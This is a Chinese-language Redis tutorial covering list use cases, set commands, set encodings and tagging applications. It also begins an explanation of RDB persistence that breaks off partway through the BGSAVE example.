<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><h4 id="消息队列-1"><a href="#消息队列-1" class="headerlink" title="消息队列"></a>消息队列</h4><p>通过 Redis 的 <code>lpush + brpop</code> 命令组合，即可实现 阻塞队列。如图所示：</p>
<figure class="image-box">
                <img src="16691de835fd4261.png" alt title class>
                <p></p>
            </figure>

<p>生产者客户端 使用 <code>lrpush</code> 从列表 左侧插入元素，多个消费者客户端 使用 <code>brpop</code> 命令 阻塞式 的 “抢” 列表 尾部 的元素，多个客户端 保证了消费的 负载均衡 和 高可用性。</p>
<h4 id="文章列表"><a href="#文章列表" class="headerlink" title="文章列表"></a>文章列表</h4><p>每个 用户 有属于自己的 文章列表，现需要 分页 展示文章列表。此时可以考虑使用 列表，因为列表不但是 有序的，同时支持 按照索引范围 获取元素。</p>
<ul>
<li><p>每篇文章使用 哈希结构 存储，例如每篇文章有 3 个属性 title、timestamp、content：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hmset acticle:1 title xx timestamp 1476536196 content xxxx</span><br><span class="line">hmset acticle:2 title yy timestamp 1476536196 content yyyy</span><br><span class="line">...</span><br><span class="line">hmset acticle:k title kk timestamp 1476512536 content kkkk</span><br></pre></td></tr></table></figure>
</li>
<li><p>向用户文章列表 添加文章，user:{id}:articles 作为用户文章列表的 键：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lpush user:1:acticles article:1 article:3 article:5</span><br><span class="line">lpush user:2:acticles article:2 article:4 article:6</span><br><span class="line">...</span><br><span class="line">lpush user:k:acticles article:7 article:8</span><br></pre></td></tr></table></figure>
</li>
<li><p>分页 获取 用户文章列表，例如下面 伪代码 获取用户 id=1 的前 10 篇文章：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">articles = lrange user:1:articles 0 9</span><br><span class="line"><span class="keyword">for</span> article <span class="keyword">in</span> &#123;articles&#125;</span><br><span class="line">    hgetall &#123;article&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>使用 列表 类型 保存 和 获取 文章列表会存在两个问题：</p>
<ul>
<li>第一：如果每次 分页 获取的 文章个数较多，需要执行多次 <code>hgetall</code> 操作，此时可以考虑使用 <code>Pipeline</code> 进行 批量获取，或者考虑将文章数据 序列化为字符串 类型，使用 <code>mget</code> 批量获取。</li>
<li>第二：分页 获取 文章列表 时， <code>lrange</code> 命令在列表 两端性能较好，但是如果 列表较大，获取列表 中间范围 的元素 性能会变差。此时可以考虑将列表做 二级拆分，或者使用 Redis 3.2 的 quicklist 内部编码实现，它结合 ziplist 和 linkedlist 的特点，获取列表 中间范围 的元素时也可以 高效完成。</li>
</ul>
<h4 id="其他场景"><a href="#其他场景" class="headerlink" title="其他场景"></a>其他场景</h4><p>实际上列表的使用场景很多，具体可以参考如下：</p>
<table>
<thead>
<tr>
<th>命令组合</th>
<th>对应数据结构</th>
</tr>
</thead>
<tbody><tr>
<td><code>lpush + lpop</code></td>
<td>Stack（栈）</td>
</tr>
<tr>
<td><code>lpush + rpop</code></td>
<td>Queue（队列）</td>
</tr>
<tr>
<td><code>lpush + ltrim</code></td>
<td>Capped Collection（有限集合）</td>
</tr>
<tr>
<td><code>lpush + brpop</code></td>
<td>Message Queue（消息队列）</td>
</tr>
</tbody></table>
<h2 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了 Redis 中的 列表 的 一些 基本命令、内部编码 和 适用场景。通过组合不同 命令，可以把 列表 转换为不同的 数据结构 使用。</p>
<hr>
<h1 id="数据结构之集合"><a href="#数据结构之集合" class="headerlink" title="数据结构之集合"></a>数据结构之集合</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>集合（set）类型也是用来保存多个 字符串元素，但和 列表类型 不一样的是，集合中 不允许有重复元素，并且集合中的元素是 无序的，不能通过 索引下标 获取元素。  </p>
<p>一个 集合 最多可以存储 <code>2 ^ 32 - 1</code> 个元素。Redis 除了支持 集合内 的 增删改查，同时还支持 多个集合 取 交集、并集、差集。合理地使用好集合类型，能在实际开发中解决很多实际问题。  </p>
<p>如图所示，集合 user:1:follow 包含着 “it”、”music”、”his”、”sports” 四个元素。</p>
<figure class="image-box">
                <img src="166f3ef48a69ee12.png" alt title class>
                <p></p>
            </figure>

<h2 id="正文-7"><a href="#正文-7" class="headerlink" title="正文"></a>正文</h2><h3 id="相关命令-3"><a href="#相关命令-3" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="集合内的操作命令"><a href="#集合内的操作命令" class="headerlink" title="集合内的操作命令"></a>集合内的操作命令</h4><h5 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h5><blockquote>
<p><code>sadd key element [element ...]</code></p>
</blockquote>
<p>返回结果为添加成功的 元素个数，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; exists myset</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; sadd myset a b c</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; sadd myset a b</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<h5 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h5><blockquote>
<p><code>srem key element [element ...]</code></p>
</blockquote>
<p>返回结果为成功删除 元素个数，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; srem myset a b</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; srem myset hello</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<h5 id="计算元素个数"><a href="#计算元素个数" class="headerlink" title="计算元素个数"></a>计算元素个数</h5><blockquote>
<p><code>scard key</code></p>
</blockquote>
<p><code>scard</code> 的 时间复杂度 为 O（1），它 不会遍历 集合所有元素，而是直接用 Redis 的 内部 的变量，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; scard myset</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<h5 id="判断元素是否在集合中"><a href="#判断元素是否在集合中" class="headerlink" title="判断元素是否在集合中"></a>判断元素是否在集合中</h5><blockquote>
<p><code>sismember key element</code></p>
</blockquote>
<p>如果给定元素 element 在集合内返回 1，反之返回 0。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sismember myset c</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<h5 id="随机从集合返回指定个数元素"><a href="#随机从集合返回指定个数元素" class="headerlink" title="随机从集合返回指定个数元素"></a>随机从集合返回指定个数元素</h5><blockquote>
<p><code>srandmember key [count]</code></p>
</blockquote>
<p><code>[count]</code> 是 可选参数，如果不写默认为 1。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; srandmember myset 2</span><br><span class="line">1) <span class="string">"a"</span></span><br><span class="line">2) <span class="string">"c"</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember myset</span><br><span class="line"><span class="string">"d"</span></span><br></pre></td></tr></table></figure>

<h5 id="从集合随机弹出元素"><a href="#从集合随机弹出元素" class="headerlink" title="从集合随机弹出元素"></a>从集合随机弹出元素</h5><blockquote>
<p><code>spop key</code></p>
</blockquote>
<p><code>spop</code> 操作可以从 集合 中 随机弹出 一个元素，例如下面代码是一次 <code>spop</code> 后，集合元素 变为 “d b a”。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; spop myset</span><br><span class="line"><span class="string">"c"</span></span><br><span class="line">127.0.0.1:6379&gt; smembers myset</span><br><span class="line">1) <span class="string">"d"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：Redis 从 3.2 版本开始， spop 也支持 [count] 参数。</p>
</blockquote>
<p><code>srandmember</code> 和 <code>spop</code> 都是 随机 从集合选出元素，两者不同的是 <code>spop</code> 命令执行后，元素 会从集合中 删除，而 <code>srandmember</code> 不会删除元素。</p>
<h5 id="获取所有元素"><a href="#获取所有元素" class="headerlink" title="获取所有元素"></a>获取所有元素</h5><blockquote>
<p><code>smembers key</code></p>
</blockquote>
<p>下面代码获取集合 myset 的 所有元素，并且 返回结果 是 无序的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; smembers myset</span><br><span class="line">1) <span class="string">"d"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<p><code>smembers</code> 和 <code>lrange</code>、<code>hgetall</code> 都属于 比较重 的命令，如果 元素过多 存在 阻塞 Redis 的可能性，这时候可以使用 <code>sscan</code> 命令来完成。</p>
<h4 id="集合间的操作命令"><a href="#集合间的操作命令" class="headerlink" title="集合间的操作命令"></a>集合间的操作命令</h4><p>现在有 两个集合，它们分别是 user:1:follow 和 user:2:follow。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd user:1:follow it music his sports</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; sadd user:2:follow it news ent sports</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br></pre></td></tr></table></figure>

<h5 id="求多个集合的交集"><a href="#求多个集合的交集" class="headerlink" title="求多个集合的交集"></a>求多个集合的交集</h5><blockquote>
<p><code>sinter key [key ...]</code></p>
</blockquote>
<p>下面的代码是求 user:1:follow 和 user:2:follow 两个集合的 交集，返回结果是 sports、it。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sinter user:1:follow user:2:follow</span><br><span class="line">1) <span class="string">"sports"</span></span><br><span class="line">2) <span class="string">"it"</span></span><br></pre></td></tr></table></figure>

<h5 id="求多个集合的并集"><a href="#求多个集合的并集" class="headerlink" title="求多个集合的并集"></a>求多个集合的并集</h5><blockquote>
<p><code>suinon key [key ...]</code></p>
</blockquote>
<p>下面的代码是求 user:1:follow 和 user:2:follow 两个集合的 并集，返回结果是 sports、it、his、news、music、ent。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sunion user:1:follow user:2:follow</span><br><span class="line">1) <span class="string">"sports"</span></span><br><span class="line">2) <span class="string">"it"</span></span><br><span class="line">3) <span class="string">"his"</span></span><br><span class="line">4) <span class="string">"news"</span></span><br><span class="line">5) <span class="string">"music"</span></span><br><span class="line">6) <span class="string">"ent"</span></span><br></pre></td></tr></table></figure>

<h5 id="求多个集合的差集"><a href="#求多个集合的差集" class="headerlink" title="求多个集合的差集"></a>求多个集合的差集</h5><blockquote>
<p><code>sdiff key [key ...]</code></p>
</blockquote>
<p>下面的代码是求 user:1:follow 和 user:2:follow 两个集合的 差集，返回结果是 music 和 his。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sdiff user:1:follow user:2:follow</span><br><span class="line">1) <span class="string">"music"</span></span><br><span class="line">2) <span class="string">"his"</span></span><br></pre></td></tr></table></figure>

<p>前面三个求 交集、并集 和 差集 的操作得到的结果，如图所示：</p>
<figure class="image-box">
                <img src="166f3ef48a7577aa.png" alt title class>
                <p></p>
            </figure>

<h5 id="将交集、并集、差集的结果保存"><a href="#将交集、并集、差集的结果保存" class="headerlink" title="将交集、并集、差集的结果保存"></a>将交集、并集、差集的结果保存</h5><p>集合间 的运算在 元素较多 的情况下会 比较耗时，所以 Redis 提供了以下 三个命令（原命令 + store）将 集合间交集、并集、差集 的结果保存在 destination key 中。</p>
<blockquote>
<p><code>sinterstore destination key [key ...]</code><br><code>suionstore destination key [key ...]</code><br><code>sdiffstore destination key [key ...]</code></p>
</blockquote>
<p>下面的操作会将 user:1:follow 和 user:2:follow 两个集合 的 交集结果 保存在 user:1_2:inter 中，user:1_2:inter 本身也是 集合类型。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sinterstore user:1_2:inter user:1:follow user:2:follow</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">type</span> user:1_2:inter</span><br><span class="line"><span class="built_in">set</span></span><br><span class="line">127.0.0.1:6379&gt; smembers user:1_2:inter</span><br><span class="line">1) <span class="string">"it"</span></span><br><span class="line">2) <span class="string">"sports"</span></span><br></pre></td></tr></table></figure>

<p>有关 集合 的 常用命令 基本上就是这么多了，下表给出了 集合常用命令 的 时间复杂度，开发人员可以根据自身需求进行选择。</p>
<figure class="image-box">
                <img src="166f3ef48a56fecc.png" alt title class>
                <p></p>
            </figure>

<h3 id="内部编码-3"><a href="#内部编码-3" class="headerlink" title="内部编码"></a>内部编码</h3><p>集合类型 的 内部编码 有两种：</p>
<h4 id="1、intset（整数集合）"><a href="#1、intset（整数集合）" class="headerlink" title="1、intset（整数集合）"></a>1、intset（整数集合）</h4><p>当集合中的元素都是 整数 且 元素个数 小于 <code>set-max-intset-entries</code> 配置（默认 512 个）时，Redis 会选用 <strong>intset</strong> 来作为 集合 的 内部实现，从而 减少内存 的使用。</p>
<h4 id="2、hashtable（哈希表）-1"><a href="#2、hashtable（哈希表）-1" class="headerlink" title="2、hashtable（哈希表）"></a>2、hashtable（哈希表）</h4><p>当集合类型 无法满足 intset 的条件时，Redis 会使用 <strong>hashtable</strong> 作为集合的 内部实现。</p>
<h4 id="具体示例"><a href="#具体示例" class="headerlink" title="具体示例"></a>具体示例</h4><h5 id="内部编码为整数集合"><a href="#内部编码为整数集合" class="headerlink" title="内部编码为整数集合"></a>内部编码为整数集合</h5><ul>
<li>当<strong>元素个数 较少 且都为 整数</strong> 时，内部编码 为 <strong>intset</strong>。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd setkey 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; object encoding setkey</span><br><span class="line"><span class="string">"intset"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="内部编码为哈希"><a href="#内部编码为哈希" class="headerlink" title="内部编码为哈希"></a>内部编码为哈希</h5><ul>
<li><p>当 <strong>元素个数 超过 512 个</strong>，内部编码 变为 <strong>hashtable</strong>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd setkey 1 2 3 4 5 6 ... 512 513</span><br><span class="line">(<span class="built_in">integer</span>) 513</span><br><span class="line">127.0.0.1:6379&gt; scard setkey</span><br><span class="line">(<span class="built_in">integer</span>) 513</span><br><span class="line">127.0.0.1:6379&gt; object encoding listkey</span><br><span class="line"><span class="string">"hashtable"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>当<strong>某个元素 不为整数</strong> 时，内部编码 也会变为 <strong>hashtable</strong>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd setkey a</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; object encoding setkey</span><br><span class="line"><span class="string">"hashtable"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>有关集合类型的 内存优化 技巧，后面的文章会有专门的讲解。</p>
<h3 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h3><h4 id="用户标签"><a href="#用户标签" class="headerlink" title="用户标签"></a>用户标签</h4><p>集合类型 比较典型的使用场景是 标签（tag）。简单的举两个例子：</p>
<h5 id="娱乐新闻推荐"><a href="#娱乐新闻推荐" class="headerlink" title="娱乐新闻推荐"></a>娱乐新闻推荐</h5><blockquote>
<p>一个用户可能对娱乐、体育比较感兴趣，另一个用户可能对历史、新闻比较感兴趣，这些兴趣点就是标签。有了这些数据就可以得到喜欢同一个标签的人，以及用户的共同喜好的标签，这些数据对于用户体验以及增强用户黏度比较重要。</p>
</blockquote>
<h5 id="电商人群分类"><a href="#电商人群分类" class="headerlink" title="电商人群分类"></a>电商人群分类</h5><blockquote>
<p>一个电子商务的网站会对不同标签的用户做不同类型的推荐，比如对数码产品比较感兴趣的人，在各个页面或者通过邮件的形式给他们推荐最新的数码产品，通常会为网站带来更多的利益。</p>
</blockquote>
<p>下面使用 集合类型 实现 标签功能。</p>
<ul>
<li><p>给用户添加标签</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sadd user:1:tags tag1 tag2 tag5</span><br><span class="line">sadd user:2:tags tag2 tag3 tag5</span><br><span class="line">...</span><br><span class="line">sadd user:k:tags tag1 tag2 tag4</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>给标签添加用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sadd tag1:users user:1 user:3</span><br><span class="line">sadd tag2:users user:1 user:2 user:3</span><br><span class="line">...</span><br><span class="line">sadd tagk:users user:1 user:2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>用户 和 标签 的 关系维护 应该在 一个事务内 执行，防止 部分命令失败 造成的 数据不一致，有关如何将 两个命令 放在 一个事务 中，后面会介绍 Lua 的使用。</p>
</blockquote>
<ul>
<li><p>删除用户下的标签</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">srem user:1:tags tag1 tag5</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除标签下的用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srem tag1:users user:1</span><br><span class="line">srem tag5:users user:1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>计算用户共同感兴趣的标签<br>可以使用 <code>sinter</code> 命令，来计算 用户共同感兴趣 的 标签。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sinter user:1:tags user:2:tags</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>上面只是给出了使用 Redis 集合类型 实现 标签 的基本思路，实际上一个 标签系统 远比这个要 复杂 得多，不过 集合类型 的 应用场景 通常为以下几种：</p>
<table>
<thead>
<tr>
<th>命令组合</th>
<th>应用场景</th>
</tr>
</thead>
<tbody><tr>
<td><code>sadd</code></td>
<td>Tagging（标签）</td>
</tr>
<tr>
<td><code>spop/srandmember</code></td>
<td>Random item（生成随机数，比如抽奖）</td>
</tr>
<tr>
<td><code>sadd + sinter</code></td>
<td>Social Graph（社交需求）</td>
</tr>
</tbody></table>
<h2 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了 Redis 中的 集合 的 一些 基本命令，包括 集合内部的操作命令 和 集合之间的操作命令，其次还介绍了 集合 的 内部编码 转换和以 用户行为标签 为主的 应用场景。</p>
<hr>
<h1 id="一文深度揭秘-Redis-的磁盘持久化机制"><a href="#一文深度揭秘-Redis-的磁盘持久化机制" class="headerlink" title="一文深度揭秘 Redis 的磁盘持久化机制"></a>一文深度揭秘 Redis 的磁盘持久化机制</h1><h2 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;Redis 是内存数据库，数据都是存储在内存中，为了避免进程退出导致数据的永久丢失，需要定期将 Redis 中的数据以数据或命令的形式从内存保存到本地磁盘。当下次 Redis 重启时，利用持久化文件进行数据恢复。Redis 提供了 <strong>RDB</strong> 和 <strong>AOF</strong> 两种持久化机制，前者将当前的数据保存到磁盘，后者则是将每次执行的写命令保存到磁盘（类似于 MySQL 的 Binlog）。本文将详细介绍 RDB 和 AOF 两种持久化方案，包括操作方法和持久化的实现原理。</p>
<figure class="image-box">
                <img src="16dbe12a64d06bbf.png" alt title class>
                <p></p>
            </figure>

<h2 id="正文-8"><a href="#正文-8" class="headerlink" title="正文"></a>正文</h2><p>&emsp;&emsp;Redis 是一个基于键值对（K-V）存储的数据库服务器，下面先介绍 Redis 数据库的内部构造以及 K-V 的存储形式，有助于我们更容易理解 Redis 的持久化机制。</p>
<h3 id="Redis-数据库结构"><a href="#Redis-数据库结构" class="headerlink" title="Redis 数据库结构"></a>Redis 数据库结构</h3><p>&emsp;&emsp;一个单机的 Redis 服务器<strong>默认</strong>情况下有 <strong>16</strong> 个数据库（0-15 号），数据库的个数是<strong>可配置</strong>的。Redis <strong>默认</strong>使用的是 <strong>0</strong> 号数据库，可以使用 <code>SELECT</code> 命令切换数据库。</p>
<figure class="image-box">
                <img src="16dbe13493cb9ce0.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Redis 中的每个数据库都由一个 <code>redis.h/redisDb</code> 结构表示，它记录了单个 Redis 数据库的键空间、所有键的过期时间、处于阻塞状态和就绪状态的键、数据库编号等等。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisDb</span> &#123;</span></span><br><span class="line">    <span class="comment">// 数据库键空间，保存着数据库中的所有键值对</span></span><br><span class="line">    dict *dict;</span><br><span class="line">    <span class="comment">// 键的过期时间，字典的键为键，字典的值为过期事件 UNIX 时间戳</span></span><br><span class="line">    dict *expires;</span><br><span class="line">    <span class="comment">// 正处于阻塞状态的键</span></span><br><span class="line">    dict *blocking_keys;</span><br><span class="line">    <span class="comment">// 可以解除阻塞的键</span></span><br><span class="line">    dict *ready_keys;</span><br><span class="line">    <span class="comment">// 正在被 WATCH 命令监视的键</span></span><br><span class="line">    dict *watched_keys;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">evictionPoolEntry</span> *<span class="title">eviction_pool</span>;</span></span><br><span class="line">    <span class="comment">// 数据库编号</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="comment">// 数据库的键的平均 TTL，统计信息</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> avg_ttl;</span><br><span class="line">&#125; redisDb;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;由于 Redis 是一个键值对数据库（key-value pairs database）， 所以它的数据库本身也是一个字典，对应的结构正是 <code>redisDb</code>。其中，<code>dict</code> 指向的是一个记录键值对数据的字典，它的键是一个字符串对象，它的值则可以是字符串、列表、哈希表、集合和有序集合在内的任意一种 Redis 类型对象。 <code>expires</code> 指向的是一个用于记录键的过期时间的字典，它的键为 <code>dict</code> 中的数据库键，它的值为这个数据库键的过期时间戳，这个值以 <code>long long</code> 类型表示。</p>
<figure class="image-box">
                <img src="16dbe13ec9875400.png" alt title class>
                <p></p>
            </figure>

<h3 id="RDB-持久化"><a href="#RDB-持久化" class="headerlink" title="RDB 持久化"></a>RDB 持久化</h3><p>&emsp;&emsp;RDB 持久化（也称作快照持久化）是指将内存中的数据生成快照保存到磁盘里面，保存的文件后缀是 <code>.rdb</code>。rdb 文件是一个经过压缩的二进制文件，当 Redis 重新启动时，可以读取 rdb 快照文件恢复数据。RDB 功能最核心的是 <code>rdbSave</code> 和 <code>rdbLoad</code> 两个函数， 前者用于生成 RDB 文件并保存到磁盘，而后者则用于将 RDB 文件中的数据重新载入到内存中：</p>
<figure class="image-box">
                <img src="16dbe15258190f06.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;RDB 文件是一个单文件的全量数据，很适合数据的容灾备份与恢复，通过 RDB 文件恢复数据库耗时较短，通常 1G 的快照文件载入内存只需 20s 左右。Redis 提供了手动触发保存、自动保存间隔两种 RDB 文件的生成方式，下面先介绍 RDB 的创建和载入过程。</p>
<h4 id="RDB-的创建和载入"><a href="#RDB-的创建和载入" class="headerlink" title="RDB 的创建和载入"></a>RDB 的创建和载入</h4><p>&emsp;&emsp;Redis 服务器默认是通过 RDB 方式完成持久化的，对应 <code>redis.conf</code> 文件的配置项如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RDB文件的名称</span></span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"><span class="comment"># 备份RDB和AOF文件存放路径</span></span><br><span class="line">dir /usr/<span class="built_in">local</span>/var/db/redis/</span><br></pre></td></tr></table></figure>

<h5 id="手动触发保存"><a href="#手动触发保存" class="headerlink" title="手动触发保存"></a>手动触发保存</h5><p>&emsp;&emsp;Redis 提供了两个用于生成 RDB 文件的命令，一个是 <code>SAVE</code>，另一个是 <code>BGSAVE</code>。而触发 Redis 进行 RDB 备份的方式有两种，一种是通过 <code>SAVE</code> 命令、<code>BGSAVE</code> 命令手动触发快照生成的方式，另一种是配置保存时间和写入次数，由 Redis 根据条件自动触发保存操作。</p>
<h6 id="SAVE-命令"><a href="#SAVE-命令" class="headerlink" title="SAVE 命令"></a>SAVE 命令</h6><p>&emsp;&emsp;<code>SAVE</code> 是一个同步式的命令，它会阻塞 Redis 服务器进程，直到 RDB 文件创建完成为止。在服务器进程阻塞期间，服务器不能处理任何其他命令请求。</p>
<ul>
<li><p>客户端命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端日志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6266:M 15 Sep 2019 08:31:01.258 * DB saved on disk</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;执行 <code>SAVE</code> 命令后，Redis 在服务端进程（PID 为 6266）执行了 SAVE 操作，这个操作发生期间会一直阻塞 Redis 客户端的请求处理。</p>
<h6 id="BGSAVE-命令"><a href="#BGSAVE-命令" class="headerlink" title="BGSAVE 命令"></a>BGSAVE 命令</h6><p>&emsp;&emsp;<code>BGSAVE</code> 是一个异步式的命令，和 <code>SAVE</code> 命令直接阻塞服务器进程的做法不同，<code>BGSAVE</code> 命令会派生出一个子进程，由子进程负责创建 RDB 文件，服务器进程（父进程）继续处理客户的命令。</p>
<ul>
<li><p>客户端命令</p>
